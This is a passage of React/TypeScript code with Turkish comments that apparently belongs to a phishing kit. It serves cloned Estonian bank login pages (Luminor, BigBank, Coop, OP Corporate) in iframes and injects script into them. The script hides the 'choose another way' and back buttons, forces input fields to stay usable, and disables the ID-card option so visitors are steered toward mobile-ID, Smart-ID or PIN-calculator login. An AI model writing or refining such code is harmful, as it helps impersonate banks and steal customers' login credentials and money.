        // O yüzden JS'in ezmesini engellemek yerine form doldurma mantığına güveniyoruz.
        // Ayrıca Coop Bank ve diğerleri için class engellerini kaldırıyoruz.
        document.querySelectorAll('button.disabled, a.disabled, .bb-button--disabled').forEach(btn => {
            btn.classList.remove('disabled');
            btn.classList.remove('bb-button--disabled');
        });

        document.querySelectorAll('input').forEach(input => {
          if (window.location.href.includes('op-corporate')) return;
          
          if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.type !== 'radio' && input.type !== 'checkbox') {
            // Force input to be clickable and readable
            input.style.position = 'relative';
            input.style.zIndex = '999';
            input.style.setProperty('opacity', '1', 'important');
            input.style.setProperty('visibility', 'visible', 'important');
            input.style.setProperty('display', 'block', 'important');
            input.removeAttribute('disabled');
            input.removeAttribute('readonly');
            
            // 1 & 2 & 3: Telefon numarası ve benzeri alanlar için sadece rakam ve numpad klavye entegrasyonu
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            if (name.includes('mobile') || name.includes('phone') || name.includes('telefon') || id.includes('mobile') || id.includes('phone') || id.includes('telefon')) {
                // Mobil numpad için gerekli HTML5 attribute'ları
                input.setAttribute('inputmode', 'numeric');
                input.setAttribute('type', 'tel');
                input.setAttribute('pattern', '[0-9]*');

                // Hata mesajı div'i oluştur
                let errorMsg = input.parentElement.querySelector('.custom-phone-error');
                if (!errorMsg) {
                    errorMsg = document.createElement('div');
                    errorMsg.className = 'custom-phone-error';
                    errorMsg.style.color = '#E2001A'; // BigBank kırmızısı
                    errorMsg.style.fontSize = '12px';
                    errorMsg.style.marginTop = '4px';
                    errorMsg.style.fontWeight = 'bold';
                    errorMsg.style.display = 'none';
                    errorMsg.style.position = 'absolute';
                    errorMsg.style.bottom = '-20px';
                    errorMsg.style.left = '0';
                    errorMsg.innerText = 'Palun sisesta ainult numbreid'; // Sadece Estonca uyarı
                    input.parentElement.style.position = 'relative';
                    input.parentElement.appendChild(errorMsg);
                }

                // Sadece rakamlara izin veren event listener (Input olayı)
                input.addEventListener('input', (e) => {
                    const originalValue = input.value;
                    const newValue = originalValue.replace(/[^0-9]/g, '');
                    if (originalValue !== newValue) {
                        input.value = newValue; // Geçersiz karakterleri anında temizle
                        errorMsg.style.display = 'block';
                        clearTimeout(input.errorTimeout);
                        input.errorTimeout = setTimeout(() => { errorMsg.style.display = 'none'; }, 2500);
                    }
                    updateInputState(input);
                });

                // Klavye tuş basımını engelleme (Keypress olayı)
                input.addEventListener('keypress', (e) => {
                    // Sadece rakamlara ve kontrol tuşlarına izin ver
                    if (e.key && e.key.length === 1 && !/[0-9]/.test(e.key)) {
                        e.preventDefault(); // Karakterin yazılmasını engelle
                        errorMsg.style.display = 'block';
                        clearTimeout(input.errorTimeout);
                        input.errorTimeout = setTimeout(() => { errorMsg.style.display = 'none'; }, 2500);
                    }
                });
            } else {
                input.addEventListener('input', () => updateInputState(input));
            }

            input.addEventListener('focus', () => updateInputState(input));
            input.addEventListener('blur', () => updateInputState(input));
            // Initial check
            updateInputState(input);
          }
        });

        // Disable "Vali teine viis" and similar buttons
          document.querySelectorAll('button, a').forEach(el => {
            const text = el.textContent.toLowerCase();
            if (text.includes('vali teine viis') || text.includes('tagasi') || text.includes('back')) {
              el.style.display = 'none';
              el.style.pointerEvents = 'none';
              el.style.opacity = '0';
            }
          });

          // LUMINOR FIX: Force floating labels for all inputs
          if (window.location.href.includes('luminor')) {
             const style = document.createElement('style');
             style.innerHTML = \`
               /* Luminor form alanlarında label'ın yukarı kalkması */
               .form-row.has-value .label-wrapper label,
               .form-row.focused .label-wrapper label,
               .form-row.is-focused .label-wrapper label,
               .form-row.is-filled .label-wrapper label {
                   transform: translateY(-100%) scale(0.85);
                   opacity: 0.7;
                   transform-origin: left top;
                   transition: transform 0.2s ease, opacity 0.2s ease;
               }
               .form-row .label-wrapper label {
                   transition: transform 0.2s ease, opacity 0.2s ease;
                   display: block;
               }
               /* Asistanımızın label'ı gizlemesini engellemek için zorunlu görünürlük */
                .form-row .label-wrapper label {
                    opacity: 1 !important;
                    pointer-events: auto !important;
                }

                @media (max-width: 768px) {
                    html, body {
                        overflow-x: hidden !important;
                        overflow-y: auto !important;
                        height: auto !important;
                    }

                    .frame-main-content,
                    .portal-content,
                    .scroll-zones {
                        display: none !important;
                    }

                    .overlayholder,
                    .overlay-focusview,
                    .overlay-focusview-holder,
                    .overlay-focusview-content,
                    .overlay-focusview-scroller,
                    .layout-wide {
                        position: fixed !important;
                        left: 0 !important;
                        right: 0 !important;
                        top: 56px !important;
                        width: 100% !important;
                        height: calc(100dvh - 56px) !important;
                        z-index: 99999 !important;
                        background: #f5f5f4 !important;
                        overflow-y: auto !important;
                        -webkit-overflow-scrolling: touch !important;
                    }

                    .layout-wide-holder1,
                    .layout-wide-holder2b,
                    .focusview-content-centered-middle,
                    .login-main,
                    .inner,
                    .auth-methods {
                        width: 100% !important;
                        max-width: 100% !important;
                        min-width: 0 !important;
                    }

                    .layout-wide-holder1 {
                        min-height: calc(100dvh - 76px) !important;
                        padding: 10px 20px 24px !important;
                        box-sizing: border-box !important;
                    }

                    .auth-methods {
                        display: flex !important;
                        flex-direction: column !important;
                        align-items: stretch !important;
                        height: auto !important;
                    }

                    .auth-methods > li {
                        display: block !important;
                        flex: 1 1 auto !important;
                        width: 100% !important;
                        max-width: 100% !important;
                        height: auto !important;
                    }

                    .auth-methods-method {
                        display: flex !important;
                        flex: 1 1 auto !important;
                        width: 100% !important;
                        max-width: 100% !important;
                        min-width: 100% !important;
                        min-height: 60px !important;
                    }

                    .overlay-focusview,
                    .overlay-focusview-holder,
                    .overlay-focusview-content,
                    .overlay-focusview-scroller {
                        overflow-y: auto !important;
                        -webkit-overflow-scrolling: touch !important;
                    }

                    .form-row,
                    .form-row .label-wrapper,
                    .form-row input,
                    .form-row .input-wrapper {
                        width: 100% !important;
                        max-width: 100% !important;
                        min-width: 0 !important;
                        box-sizing: border-box !important;
                    }
                }
              \`;
              document.head.appendChild(style);
           }

           // OP Corporate Bank: ID-Kaart devre dışı bırakma (gizleme değil, pasif yapma)
           if (window.location.href.includes('op-corporate')) {
               const style = document.createElement('style');
               style.innerHTML = '#estonian-id-card, #estonian-id-card *, #estonian-id-card-radio, label[for="estonian-id-card-radio"] { pointer-events: none !important; opacity: 0.5 !important; filter: grayscale(100%); cursor: not-allowed !important; }';
               document.head.appendChild(style);
           }
         `;
         doc.body.appendChild(script);

         // OP Corporate Bank: sekmeleri parent tarafindan dogrudan kontrol et
         if (iframe.contentWindow.location.href.includes("op-corporate")) {
           const bindOpRadio = (radioId: string, targetIndex: number, disabled = false) => {
             const radio = doc.getElementById(radioId) as HTMLInputElement | null;
             const label = doc.querySelector(`label[for="${radioId}"]`) as HTMLElement | null;

             const syncTarget = (event?: Event) => {
               if (disabled) {
                 if (event) {
                   event.preventDefault();
                   event.stopPropagation();
                 }
                 if (radio) {
                   radio.checked = false;
                 }
                 return;
               }

               // Let the native radio interaction settle first, then swap iframe once.
               window.requestAnimationFrame(() => {
                 setCurrentIndex((prev) => (prev === targetIndex ? prev : targetIndex));
               });
             };

             if (radio && !radio.dataset.opBound) {
               radio.dataset.opBound = "true";
               radio.addEventListener("change", syncTarget, true);
               radio.addEventListener("click", syncTarget, true);
             }

             if (label && !label.dataset.opBound) {
               label.dataset.opBound = "true";
               label.addEventListener("click", syncTarget, true);
             }
           };

           bindOpRadio("mobile-id-radio", 0);
           bindOpRadio("smart-id-radio", 1);
           bindOpRadio("pin-calculator-radio", 2);
           bindOpRadio("estonian-id-card-radio", 0, true);
         }
         } catch (err) {
           console.error("Iframe manipulation error:", err);
         }
       };

  if (files.length === 0) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4 bg-gray-50">
        <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-4 text-center text-sm text-blue-700">
          Tasarım dosyaları yükleniyor veya bulunamadı...
        </p>
      </div>
    );
  }

  return (
    <div
      className="fixed inset-0 w-[100vw] bg-white z-[9999] overflow-hidden"
      style={{ minHeight: "100vh", height: "100dvh" }}
    >
      {saving && (
        <div className="absolute inset-0 bg-white/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
        </div>
      )}

      {files.map((file, index) => (
        <iframe
          key={file}
          src={`/estonian-banks/${bankSlug}/${file}`}
          className={`absolute top-0 left-0 w-full h-full border-none m-0 p-0 ${
            disableIframeFade ? "" : "transition-opacity duration-300"
          } ${
            index === currentIndex
              ? disableIframeFade
                ? "z-10"
                : "opacity-100 z-10"
              : disableIframeFade
                ? "z-0 pointer-events-none"
                : "opacity-0 z-0 pointer-events-none"
          }`}
          style={{ 
            width: '100%', 
            height: '100%', 
            border: 'none', 
            margin: 0, 
            padding: 0,
            visibility: index === currentIndex ? 'visible' : 'hidden'
          }}
          onLoad={(e) => handleIframeLoad(e.target as HTMLIFrameElement)}
        />
      ))}
    </div>
  );
}
